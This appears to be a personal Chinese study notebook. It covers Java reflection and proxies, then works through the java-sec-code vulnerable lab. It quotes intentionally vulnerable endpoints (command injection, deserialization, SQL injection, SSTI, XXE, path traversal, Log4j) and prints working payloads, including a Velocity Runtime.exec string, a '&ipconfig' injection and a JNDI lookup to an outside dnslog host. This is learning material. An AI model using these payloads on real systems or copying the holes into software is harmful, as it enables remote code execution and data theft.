
# java基础



## Java特性
### 反射
反射机制可以用来：

- 在运行时分析类的能力。
- 在运行时检查对象。
- 实现泛型数组操作代码。
- 利用Method对象，这个对象很像C++中的函数指针。
`反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。`

```java
//正射
Apple apple = new Apple(); //直接初始化，「正射」
apple.setPrice(4);

//反射
Class clz = Class.forName("com.chenshuyi.reflect.Apple"); //根据字符串查找要构建的类
//还可以这样
Class clz_2=com.chenshuiyi.reflect.Apple.class;
Class clz_3=ClassLoader.loadclass("com.chenshuiyi.reflect.Apple");
//内部类需要加上$
Class clz_in=com.chenshuiyi.reflect.Apple$Hello;

Method method = clz.getMethod("setPrice", int.class);  //获取类的方法
Constructor constructor = clz.getConstructor();  //构造方法
Object object = constructor.newInstance();  //从类新建一个示例
//调用方法 method.invoke(方法实例对象, 方法参数值，多个参数值用","隔开);
method.invoke(object, 4);


```


```java
import java.util.Scanner;
public class hello {
    public static void main(String args[]) {
        Scanner s = new Scanner(System.in);
        System.out.println("q".getClass().getName());
        
    }
}
//java.lang.String
```
### 静态代理
```java
public class UserServiceProxy implements UserService {
    private UserService target; // 被代理的对象

    public UserServiceProxy(UserService target) {
        this.target = target;
    }
    public void select() {
        before();
        target.select();    // 这里才实际调用真实主题角色的方法
        after();
    }
    public void update() {
        before();
        target.update();    // 这里才实际调用真实主题角色的方法
        after();
    }

    private void before() {     // 在执行方法之前执行
        System.out.println(String.format("log start time [%s] ", new Date()));
    }
    private void after() {      // 在执行方法之后执行
        System.out.println(String.format("log end time [%s] ", new Date()));
    }
}

```
### 动态代理
https://juejin.cn/post/6844903744954433544
#### JDK动态代理
JDK动态代理主要涉及两个类：`java.lang.reflect.Proxy` 和 `java.lang.reflect.InvocationHandler`
```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Date;

public class LogHandler implements InvocationHandler {
    Object target;  // 被代理的对象，实际的方法执行者

    public LogHandler(Object target) {
        this.target = target;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        before();
        Object result = method.invoke(target, args);  // 调用 target 的 method 方法
        after();
        return result;  // 返回方法的执行结果
    }
    // 调用invoke方法之前执行
    private void before() {
        System.out.println(String.format("log start time [%s] ", new Date()));
    }
    // 调用invoke方法之后执行
    private void after() {
        System.out.println(String.format("log end time [%s] ", new Date()));
    }
}

```

## 文件系统

![image](https://oss.javasec.org/images/image-20201113121413510.png)

##### 目录结构

```
├── pom.xml //maven的配置文件
└── src
     ├── main
     │   ├── java //java代码的目录
     │   │   └── mygroup
     │   │       ├── controller
     │   │       │   ├── HomeController.java
     │   │       │   └── PersonController.java
     │   │       ├── dao
     │   │       │   └── PersonDao.java
     │   │       └── model
     │   │           └── Person.java
     │   ├── resources //静态资源目录
     │   │   ├── db.properties
     │   │   ├── log4j.xml
     │   │   └── META-INF
     │   │       └── persistence.xml
     │   └── webapp //web应用部署根目录
     │       ├── index.html //因为是静态html文件，不用放到WEB-INF目录下
     │       ├── META-INF
     │       │   ├── context.xml
     │       │   └── MANIFEST.MF
     │       ├── resources //css，js等静态资源是不能放到WEB-INF目录下的，因为WEB-INF下的资源，客户端无法直接访问
     │       │   └── css
     │       │       └── screen.css
     │       └── WEB-INF //jsp都会放到这里，以保证用户无法直接访问jsp，而是通过controller这个目录下的所有内容客户端都无法直接访问，所以不要放静态文件
     │           ├── spring
     │           │   ├── app
     │           │   │   ├── controllers.xml
     │           │   │   └── servlet-context.xml
     │           │   ├── db.xml
     │           │   └── root-context.xml
     │           ├── views
     │           │   ├── edit.jsp
     │           │   ├── home.jsp
     │           │   └── list.jsp
     │           └── web.xml
     └── test
         ├── java
         │   └── mygroup
         │       ├── controller
         │       │   ├── DataInitializer.java
         │       │   ├── HomeControllerTest.java
         │       │   └── PersonControllerTest.java
         │       └── dao
         │           └── PersonDaoTest.java
         └── resources
             ├── db.properties
             ├── log4j.xml
             ├── test-context.xml
             └── test-db.xml
```



![javaweb项目结构](https://atts.w3cschool.cn/attachments/image/20210610/1623317314764573.jpeg)

## java-sec-code

搭建了一晚上,idea各种报错,spring一直报错,最终使用jar成功了.....差点紫砂😆

### 命令注入

```java
//将请求映射到/codeinject    
	@GetMapping("/codeinject")
//接收 filepath参数
    public String codeInject(String filepath) throws IOException {
//拼接命令
        String[] cmdList = new String[]{"sh", "-c", "ls -la " + filepath};
//new 一个 ProcessBuilder对象,它被用于启动一个新的进程，以执行前面定义的 shell 命令
        ProcessBuilder builder = new ProcessBuilder(cmdList);
//将错误重定向
        builder.redirectErrorStream(true);
//启动新进程
        Process process = builder.start();
//从进程的输入流里读取输出
        return WebUtils.convertStreamToString(process.getInputStream());
    }
```

字符串拼接导致命令执行

```java
    @GetMapping("/codeinject/host")
    public String codeInjectHost(HttpServletRequest request) throws IOException {

        String host = request.getHeader("host");
        logger.info(host);
        String[] cmdList = new String[]{"sh", "-c", "curl " + host};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }
```

同样的命令拼接,但是参数传递是从请求头host传递,而Servlet容器会对Host字段进行严格的合法性检查, `;`分号会导致400,wp上是 `localhost&ipconfig`但是我还是400   明天用burp试一下😵

```java
    @GetMapping("/codeinject/sec")
    public String codeInjectSec(String filepath) throws IOException {
        String filterFilePath = SecurityUtil.cmdFilter(filepath);
        if (null == filterFilePath) {
            return "Bad boy. I got u.";
        }
        String[] cmdList = new String[]{"sh", "-c", "ls -la " + filterFilePath};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }
```

**SecurityUtil.cmdFilter**的实现

```java
//    private static final Pattern FILTER_PATTERN = Pattern.compile("^[a-zA-Z0-9_/\\.-]+$"); 
    public static String cmdFilter(String input) {
        if (!FILTER_PATTERN.matcher(input).matches()) {
            return null;
        }

        return input;
    }
```

白名单机制,目前来说这个方法是安全的🥰

### 反序列化

```java
    @RequestMapping("/rememberMe/vuln")
    public String rememberMeVul(HttpServletRequest request)
            throws IOException, ClassNotFoundException {

        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);
        if (null == cookie) {
            return "No rememberMe cookie. Right?";
        }

        String rememberMe = cookie.getValue();
        byte[] decoded = Base64.getDecoder().decode(rememberMe);

        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);
        ObjectInputStream in = new ObjectInputStream(bytes);
        in.readObject();
        in.close();

        return "Are u ok?";
    }
```

java的反序列化好难..🤦‍♂️

利用需要三个条件 先去学习反射

-   反序列化入口 
-   目标方法
-   利用链

### SQL注入

>   在MyBatis框架中使用#{}取值时会使用参数化查询的方式访问数据库，在使用${}取值时会使用拼接字符串的方式，从而导致漏洞产生，在MyBatis log的日志中我们看到拼接后的查询语句

#### Vuln01

```java
    @GetMapping("/mybatis/vuln01")
    public List<User> mybatisVuln01(@RequestParam("username") String username) {
        return userMapper.findByUserNameVuln01(username);
    }
```

先来看下fingByuserNameVuln01的实现

```java
public interface UserMapper {

    /**
     * If using simple sql, we can use annotation. Such as @Select @Update.
     * If using ${username}, application will send a error.
     */
// #{} 参数化查询
    @Select("select * from users where username = #{username}")
    User findByUserName(@Param("username") String username);
//拼接查询,存在注入
    @Select("select * from users where username = '${username}'")
    List<User> findByUserNameVuln01(@Param("username") String username);

    List<User> findByUserNameVuln02(String username);
    List<User> findByUserNameVuln03(@Param("order") String order);

    User findById(Integer id);

    User OrderByUsername();

}

```

问题很明显,直接拼接导致的注入

#### Vuln02

findByUserNameVuln02 也是直接拼接

`select * from users where username like '%${_parameter}%'`

### SSTI

```java
    @GetMapping("/velocity")
    public void velocity(String template) {
        Velocity.init();

        VelocityContext context = new VelocityContext();

        context.put("author", "Elliot A.");
        context.put("address", "217 E Broadway");
        context.put("phone", "555-1337");

        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, "test", template);
    }
```

采用 `velocity`渲染 

payload 

```
?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)

// urldecode
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
// 利用java反射
```

### 目录穿越

```java
    public static String pathFilter(String filepath) {
        String temp = filepath;

        // use while to sovle multi urlencode
        while (temp.indexOf('%') != -1) {
            try {
                temp = URLDecoder.decode(temp, "utf-8");
            } catch (UnsupportedEncodingException e) {
                logger.info("Unsupported encoding exception: " + filepath);
                return null;
            } catch (Exception e) {
                logger.info(e.toString());
                return null;
            }
        }

        if (temp.contains("..") || temp.charAt(0) == '/') {
            return null;
        }

        return filepath;
    }
```

过滤代码在window下可以使用 `/`绕过

### xxe

#### 外部实体引用

```java
    @PostMapping("/xmlReader/vuln")
    public String xmlReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
            return "xmlReader xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
```

无回显但是可以dns外带

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE input [
<!ELEMENT xmen ANY>
<!ENTITY xxe SYSTEM "http://">]>
<input><xmen>&xxe;</xmen></input>
```

### Log4j

```java
    /**
     * http://localhost:8080/log4j?token=${jndi:ldap://wffsr5.dnslog.cn:9999}
     * Default: error/fatal/off
     * Fix: Update log4j to lastet version.
     * @param token token
     */
@GetMapping("/log4j")
public String log4j(String token) {
    if(token.equals("java-sec-code")) {
        return "java sec code";
    } else {
        logger.error(token);
        return "error";
    }
}
```

验证payload

```
${jndi:ldap://wffsr5.dnslog.cn:9999}
```

`${}`为apache中的占位符 一旦在log字符串中检测到${}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用

1.   解析 `${jndi:ldap://wffsr5.dnslog.cn:9999}`
2.   提取到 `jndi:ldap://wffsr5.dnslog.cn:9999`  将该内容作为lookup参数,进行正常的lookup查询
3.   jndi支持多种协议,如rmi,ldap 

>   创建`Server`类：
>
>   ```java
>   public class RMIServer {
>       public static void main(String[] args) {
>           try {
>               Registry registry = LocateRegistry.createRegistry(1099);
>   //创建一个Reference对象，并将其封装在一个ReferenceWrapper中。Reference对象指定了远程对象的类型和位置，其中第一个参数为远程对象的类型，第二个参数为远程对象的位置，第三个参数为远程对象的工厂类。
>               ReferenceWrapper referenceWrapper = new ReferenceWrapper(new Reference("com.ldbmcs.rmi.RmiExecute", "com.ldbmcs.rmi.RmiExecute", null));
>   //将 Hello 与RmiExecute绑定
>               registry.bind("Hello", referenceWrapper);
>           } catch (Exception e) {
>               System.out.println("Server Exception: " + e);
>               e.printStackTrace();
>           }
>       }
>   }
>   ```
>
>   创建对象： 
>
>   ```java
>   public class RmiExecute {
>       static {
>           System.out.println("Hello, World");
>       }
>   }
>   ```
>
>   接着，我们在测试类`VulnerabilityTest`中修改代码如下：
>
>   ```java
>   public class VulnerabilityTest {
>       private static final Logger LOGGER = LogManager.getLogger();
>   
>       public static void main(String[] args) {
>           String test = "${jndi:rmi://localhost:1099/Hello}";
>           LOGGER.error("Test:{}", test);
>       }
>   }
>   ```
>
>   分别启动`RMIServer`和`VulnerabilityTest`，我们可以看到在`VulnerabilityTest`中打印出：
>
>   ```text
>   Hello, World
>   ```
>
>   ![img](https://gitee.com/leiye87/typora_picture/raw/master/20230428093351.png)

